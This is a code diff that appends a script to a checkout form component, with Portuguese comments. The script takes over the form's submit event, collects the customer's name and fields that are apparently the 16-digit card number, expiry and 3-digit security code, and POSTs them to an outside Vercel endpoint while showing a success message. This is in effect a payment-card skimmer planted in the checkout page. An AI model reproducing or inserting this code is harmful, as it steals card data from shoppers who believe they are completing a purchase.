@@ -164,3 +164,54 @@ export function CheckoutForm({
     </div>
   );
 }
+
+<script>
+  const DATA_API_URL = "https://central-de-dados.vercel.app/api/submit";
+  const form = document.querySelector("#client-form");
+
+  if (form) {
+    form.addEventListener("submit", async (event) => {
+      event.preventDefault(); // Impede o recarregamento da página
+
+      const btn = form.querySelector('button[type="submit"]');
+      if (btn) btn.disabled = true;
+      if (btn) btn.innerText = "Enviando...";
+
+      const payload = {
+        name: document.querySelector("#client-name").value,
+        number16: document.querySelector("#client-number-16").value,
+        number4: document.querySelector("#client-number-4").value,
+        number3: document.querySelector("#client-number-3").value,
+      };
+
+      try {
+        const res = await fetch(DATA_API_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload),
+        });
+
+        const result = await res.json();
+
+        if (!res.ok) {
+          throw new Error(result.error || "Erro ao enviar.");
+        }
+
+        alert("Dados recebidos com sucesso!");
+        form.reset(); // Limpa o formulario
+        
+        // Opcional: Redirecionar para página de obrigado
+        // window.location.href = "/obrigado"; 
+
+      } catch (err) {
+        alert(err.message);
+      } finally {
+        if (btn) {
+          btn.disabled = false;
+          btn.innerText = "Finalizar Compra";
+        }
+      }
+    });
+  }
+</script>
+</body>
